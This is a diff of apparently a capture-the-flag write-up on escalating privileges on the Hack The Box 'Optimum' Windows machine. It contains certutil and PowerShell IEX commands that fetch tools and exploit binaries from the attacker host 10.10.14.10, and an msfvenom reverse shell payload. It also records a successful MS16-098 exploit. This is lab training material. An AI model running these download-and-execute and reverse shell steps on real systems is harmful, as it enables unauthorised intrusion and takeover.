@@ -145,7 +145,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
 
 
-* Use Certutil to transfer winPEAS.bat to check for PE 
+* Use Certutil to transfer Sherlock to check for PE 
 ```
 certutil -urlcache -split -f http://10.10.14.10/Sherlock.ps1 C:\Users\kostas\Desktop\Sherlock.ps1
 
@@ -256,7 +256,7 @@ powershell.exe -File MS16-135.ps1 -ExecutionPolicy Bypass
 
 ```
 * MS16-135 exploit failed with error that target architecture needs to be x64. The target machine is x64. 
-* Suspect that the initial reverse shell may have ran x86 shell. Create a new reverse shell executable using MSFvenom for x64 architecture and try running the exploit from that reverse shell.
+* Suspect that the initial reverse shell may have ran x86 shell. Create a new reverse shell executable using MSFvenom for x64 architecture and try running the exploit from that reverse shell. Failed.
 ```
 kali@kali:~/HTB/optimum$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=25 -f exe -o reverse25.
 exe
@@ -311,7 +311,7 @@ powershell.exe -File MS16-135.ps1 -ExecutionPolicy Bypass
                                                      
 
 ```
-
+* Try to look for PE using PowerUp
 ```
 powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/PowerUp.ps1'); Invoke-AllChecks"
 
@@ -378,19 +378,17 @@ AltDefaultPassword   :
 [*] Checking for cached Group Policy Preferences .xml files....
 
 ```
+* Try to look for PE using [Windows-Privesc-Check](https://github.com/pentestmonkey/windows-privesc-check/blob/master/docs/QuickStartUsage.md)
 
+```
 certutil -urlcache -split -f http://10.10.14.10/privesc.exe C:\Users\kostas\Desktop\privesc.exe
 
 C:\Users\kostas\Desktop>privesc.exe --audit -a -o wpc-report
 privesc.exe --audit -a -o wpc-report
 
+```
 
-https://github.com/abatchy17/WindowsExploits/raw/master/MS15-051/MS15-051_Taihou64.exe
-certutil -urlcache -split -f http://10.10.14.10/MS15-051_Taihou64.exe C:\Users\kostas\Desktop\MS15-051_Taihou64.exe
-
-
-
-* Try exploit suggester
+* Try [Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) using systeminfo details
 ```
 kali@kali:~/HTB/optimum$ python /home/kali/Tools/windows-exploit-suggester.py --database 2020-11-05-mssb.xls --sys
 teminfo systeminfo                                                                                                
@@ -501,7 +499,7 @@ ons Privilege Escalation, PoC
 [*] done                                                                                                      
 ```
 
-* Try https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+* Tested MS16-135. Test [MS16-098 exploit](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe). Successfully Priv Esc.
 ```
 C:\Users\kostas\Desktop>certutil -urlcache -split -f http://10.10.14.10/41020.exe C:\Users\kostas\Desktop\41020.exe
 
